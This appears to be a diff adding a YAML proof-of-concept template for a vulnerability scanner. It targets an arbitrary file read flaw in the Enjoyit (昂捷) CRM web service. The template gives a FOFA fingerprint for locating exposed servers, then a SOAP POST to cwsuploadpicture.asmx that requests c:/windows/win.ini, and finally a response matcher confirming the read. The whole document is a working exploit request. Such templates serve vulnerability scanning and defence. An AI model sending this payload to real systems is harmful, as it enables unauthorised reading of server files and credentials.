@@ -1,0 +1,29 @@
+id: poc-yaml-enjoyit-crm-cwsuploadpicture-asmx-anyfile-read
+info:
+  name: 昂捷CRM cwsuploadpicture.asmx 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 昂捷CRM
+  fofa: body="/ClientBin/slEnjoy.App.xap"
+requests:
+- method: POST
+  path: /enjoyRMIS_WS/WS/Common/cwsuploadpicture.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: http://tempuri.org/GetPicture
+  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    >\n  <soap:Body>\n    <GetPicture xmlns=\"http://tempuri.org/\">\n      <sFullFileName>c:/windows/win.ini</sFullFileName>\n\
+    \    </GetPicture>\n  </soap:Body>\n</soap:Envelope>"
+  expression: 'status_code == 200 &&
+
+    contains(body,"Yml0IGFwcCBzdXBwb3J0DQpbZm9udHNdDQpbZXh0ZW5zaW9uc10N") &&
+
+    contains(body,"<GetPictureResult>") &&
+
+    contains(content_type,"text/xml")
+
+    '
+variables: {}
+transport: http
